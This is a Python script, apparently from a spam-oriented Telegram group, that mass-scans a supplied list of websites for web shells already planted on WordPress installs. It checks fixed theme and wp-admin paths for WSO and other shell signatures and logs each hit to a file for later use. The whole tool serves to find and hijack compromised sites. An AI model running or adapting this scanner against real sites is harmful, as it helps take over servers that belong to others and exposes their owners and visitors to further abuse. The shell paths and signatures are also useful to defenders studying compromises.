import requests
from multiprocessing.dummy import Pool

print(r"""  
  _________ __                                    _________                .__    .__  _________            
 /   _____//  |______ _______   ____   ___________\_   ___ \  ____   ____ |  |__ |  | \_   ___ \  ____  
 \_____  \\   __\__  \\_  __ \_/ __ \ /  ___/  _ \/    \  \/ /  _ \ /    \|  |  \|  | /    \  \/ /  _ \ 
 /        \|  |  / __ \|  | \/\  ___/ \___ (  <_> )     \___(  <_> )   |  \   Y  \  |_\     \___(  <_> )
/_______  /|__| (____  /__|    \___  >____  >____/ \______  /\____/|___|  /___|  /____/\______  /\____/ 
        \/           \/            \/     \/              \/            \/     \/             \/        

   Telegram Channel: spammersfamily
   Telegram User: Morphoisis
""")

def exploit(url):
    head = {'User-agent': 'Mozilla/5.0 (Linux; Android 11; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36'}
    shells = {
        '/wp-content/themes/signify/firkon.php': 'FierzaXploit {Mini Shell }',
        '/wp-content/themes/mero-megazines/ws.php': 'WSO 5.5</title>',
        '/wp-admin/css/colors/coffee/index.php': '<p align="center"><center><font style="font-size:13px"'
    }
    try:
        for path, identifier in shells.items():
            if identifier in requests.get(url + path, headers=head, timeout=10).text:
                print(f' [ FOUND ] {url}{path}')
                open('shells.txt', 'a').write(url + path + '\n')
                break
        else:
            print(f' [ NOT FOUND ] {url}')
    except:
        pass

def main():
    try:
        urls = open(input(' List : '), 'r').read().splitlines()
        Pool(int(input(' Thread : '))).map(exploit, urls)
    except FileNotFoundError:
        print(' List Not Found')
    except ValueError:
        print(' Invalid Thread Count')
    except:
        print(' An unexpected error occurred.')

if __name__ == '__main__':
    main()
